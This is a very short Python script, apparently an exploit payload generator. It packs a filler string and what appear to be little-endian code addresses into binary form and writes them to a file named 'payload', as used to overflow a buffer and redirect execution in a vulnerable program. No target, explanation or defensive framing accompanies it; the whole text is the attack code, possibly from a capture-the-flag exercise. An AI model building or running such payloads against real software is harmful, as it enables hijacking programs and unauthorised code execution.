import struct

payload = struct.pack(">Q", 0x31323300AA7A0000) + \
           struct.pack(">Q", 0x8006400000000000) + \
           struct.pack(">Q", 0x70D1FFFFFF7F0000) + \
           struct.pack(">L", 0x52064000)

with open('payload', 'wb') as f:
    f.write(payload)

    